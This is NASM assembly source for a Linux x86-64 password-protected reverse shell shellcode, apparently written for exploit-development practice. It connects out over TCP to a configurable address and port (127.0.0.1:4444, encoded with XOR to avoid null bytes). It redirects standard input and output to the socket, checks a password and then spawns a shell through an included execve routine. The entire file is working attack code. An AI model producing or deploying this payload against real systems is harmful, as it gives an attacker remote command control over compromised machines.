global _start

%define pass "pass"
%define port 0x5c11  ; htons(4444)

%define _START
_start:
    jmp real_start
    password: db pass
    pass_len: db $-password

real_start:
socket:
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41
    ; On success, a file descriptor for the new socket is returned

    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    cdq       ; copies rax's bit 31 to all bits of edx (zeroes rdx)
    syscall

    push rax
    pop rdi

connect:
    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    ; AF_INET = 2
    ; __NR_connect = 42
    ; On success, zero is returned

    xor eax, eax
    push rax          ; sin_zero
    push 0x10ffff70   ; sin_addr (xored)
    xor dword [rsp], 0x11ffff0f ; recover sin_addr
    push word port
    push word 2

    ; connect
    add al, 42
    push rsp
    pop rsi
    add dl, 16    ; sizeof(sockaddr_in)
    syscall

dup2:
    ; dup2(sock, 0);
    ; dup2(sock, 1);
    ; dup2(sock, 2);
    ; __NR_dup2 = 33
    ; On success, return the new file descriptor

    push 2
    pop rsi

dup2_loop:
    mov al, 33
    syscall
    dec esi
    jns dup2_loop

read_password:
    ; read(int fd, void *buf, size_t count)
    ; On success, the number of bytes read is returned

    ;xor eax, eax  ; already done by dup2
    ;rdi = "sock"  ; already done
    push rax
    push rax       ; create space for "buf" in the stack
    push rsp
    pop rsi        ; rsi = *buf
    mov dl, 16
    syscall

compare_password:
    xor ecx, ecx
    lea rdi, [rel pass_len]
    mov cl, [rdi]
    sub rdi, rcx
    cld
    repz cmpsb
    jne exit

execve:
    %include "execve-stack.nasm"

exit:
    ;xor eax, eax  ; upper bytes are zero after read
    mov al, 60
    syscall
